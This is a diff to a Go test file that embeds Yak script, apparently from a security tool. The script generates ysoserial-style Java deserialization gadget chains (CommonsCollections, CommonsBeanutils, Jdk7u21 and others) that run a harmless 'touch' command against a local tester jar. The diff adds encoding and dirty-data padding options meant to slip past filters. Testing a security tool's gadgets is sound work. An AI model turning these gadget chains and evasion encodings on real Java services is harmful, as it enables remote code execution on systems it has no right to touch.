@@ -7,6 +7,7 @@ import (
 )
 
 var ysoTestCode = `
+failedGadgets = []
 extArgsMap = {
 	"CommonsBeanutils2_183":"org.apache.commons.beanutils.BeanComparator:cb183",
 	"CommonsBeanutils1_183":"org.apache.commons.beanutils.BeanComparator:cb183",
@@ -19,37 +20,45 @@ extArgsMap = {
 }
 transformChianGadgets = ["CommonsCollections1","CommonsCollections5","CommonsCollections6","CommonsCollections6Lite","CommonsCollections7","CommonsCollections9","CommonsCollectionsK3"]
 for gadgetName in transformChianGadgets{
-	extArg = ""
-	if extArgsMap[gadgetName] != nil{
-		extArg = "=/tmp,"+extArgsMap[gadgetName]
+	try {
+		extArg = ""
+		if extArgsMap[gadgetName] != nil{
+			extArg = "=/tmp/classes,"+extArgsMap[gadgetName]
+		}
+		randomstr = str.RandStr(8)
+		path = "/tmp/%s" % randomstr
+		gadgetIns = yso.GetGadget(gadgetName,"raw_cmd","touch "+path)~
+		payload1 = yso.ToBytes(gadgetIns)~
+		payload = yso.ToBytes(gadgetIns,yso.threeBytesCharString(),yso.dirtyDataLength(10000))~
+		assert len(payload) - len(payload1) > 10000
+		payloadBase64 = codec.EncodeBase64(payload)~
+		cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java '-javaagent:/tmp/yak-yso-tester-loader.jar%s' -jar /tmp/yak-yso-tester.jar '%s'"%[extArg,payloadBase64]
+		exec.System(cmd)
+		if !file.IsExisted(path){
+			panic("not found file")
+		}
+		file.Remove(path)
+		log.info("gadget %s exec test success",gadgetName)
+	} catch e {
+		log.error("gadget %s exec test failed: %v", gadgetName,e)
+		failedGadgets.Append(gadgetName)
 	}
-	randomstr = str.RandStr(8)
-	path = "/tmp/%s" % randomstr
-	gadgetIns = yso.GetGadget(gadgetName,yso.useTransformChain("raw_cmd","touch "+path))~
-	payload = yso.ToBytes(gadgetIns)~
-	payloadBase64 = codec.EncodeBase64(payload)~
-	cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java '-javaagent:/tmp/yak-yso-tester-loader.jar%s' -jar /tmp/yak-yso-tester.jar '%s'"%[extArg,payloadBase64]
-	exec.System(cmd)
-	if !file.IsExisted(path){
-		panic("not found file")
-	}
-	file.Remove(path)
-	log.info("gadget %s exec test success",gadgetName)
 }
 
 templateGadgetNames = ["CommonsCollectionsK1","CommonsCollectionsK2","Jdk7u21","CommonsCollections8","MozillaRhino2","JSON1","CommonsBeanutils1","Click1","Spring2","CommonsCollections10","CommonsBeanutils2","CommonsBeanutils1_183","JavassistWeld1","CommonsCollections11","Spring1","CommonsCollections3","Jdk8u20","CommonsCollections2","JBossInterceptors1","MozillaRhino1","ROME","CommonsBeanutils2_183","CommonsCollections4","Hibernate1","Vaadin1"]
-//templateGadgetNames = ["MozillaRhino1"]
-failedGadgets = []
+//templateGadgetNames = ["CommonsCollections8"]
 for gadgetName in templateGadgetNames{
 	try{
 		extArg = ""
 		if extArgsMap[gadgetName] != nil{
-			extArg = "=/tmp,"+extArgsMap[gadgetName]
+			extArg = "=/tmp/classes,"+extArgsMap[gadgetName]
 		}
 		randomstr = str.RandStr(8)
 		path = "/tmp/%s" % randomstr
-		gadgetIns = yso.GetGadget(gadgetName,yso.useRuntimeExecEvilClass("touch "+path))~
-		payload = yso.ToBytes(gadgetIns)~
+		gadgetIns = yso.GetGadget(gadgetName,"RuntimeExec","touch "+path)~
+		payload1 = yso.ToBytes(gadgetIns)~
+		payload = yso.ToBytes(gadgetIns,yso.twoBytesCharString(),yso.dirtyDataLength(10000))~
+		assert len(payload) - len(payload1) > 10000
 		payloadBase64 = codec.EncodeBase64(payload)~
 		cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java '-javaagent:/tmp/yak-yso-tester-loader.jar%s' -jar /tmp/yak-yso-tester.jar '%s'"%[extArg,payloadBase64]
 		exec.System(cmd)
@@ -83,7 +92,7 @@ func TestGadgetBaseExternalJarTool(t *testing.T) {
 const classTestCode = `
 execPayload = (arg...) => {
 	gadgetIns = yso.GetGadget("CommonsBeanutils1",arg...)~
-	payload = yso.ToBytes(gadgetIns)~
+	payload = yso.ToBytes(gadgetIns,yso.twoBytesCharString())~
 	payloadBase64 = codec.EncodeBase64(payload)~
 	cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java '-javaagent:/tmp/yak-yso-tester-loader.jar' -jar /tmp/yak-yso-tester.jar '%s'"%[payloadBase64]
 	exec.System(cmd)
